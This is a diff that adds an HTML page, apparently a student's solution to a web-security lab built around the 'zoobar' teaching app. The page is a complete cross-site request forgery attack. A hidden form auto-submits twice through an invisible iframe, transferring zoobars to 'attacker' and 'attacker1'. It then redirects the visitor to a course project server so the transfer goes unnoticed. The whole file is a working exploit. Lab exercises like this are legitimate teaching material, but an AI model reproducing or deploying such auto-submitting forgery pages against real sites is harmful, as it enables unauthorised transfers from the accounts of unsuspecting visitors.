@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8"/>
+        <title>Transfer</title>
+    </head>
+    <body>
+        <form method="POST" name="transferform" id="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="myframe" style="display:none">
+            <input name="zoobars" value="1" type="text">
+            <input name="recipient" value="attacker" type="text">
+            <input name="submission" value="Send" type="submit">
+        </form>
+
+        <iframe name="myframe" id="myframe" style="height:0px; width:0px; visibility:hidden"></iframe>
+
+        <script>
+            var flag = false;
+            document.getElementById('transferform').submit();
+            document.getElementById('myframe').onload = function(){
+                if(flag == false){
+                    flag = true;
+                    document.getElementsByName('zoobars')[0].value = "9";
+                    document.getElementsByName('recipient')[0].value = 'attacker1';
+                    document.getElementById('transferform').submit();
+                }
+                else{
+                    window.location = "http://cseproj91.cse.iitk.ac.in:9443";
+                }
+            }
+        </script>
+    </body>
+</html>
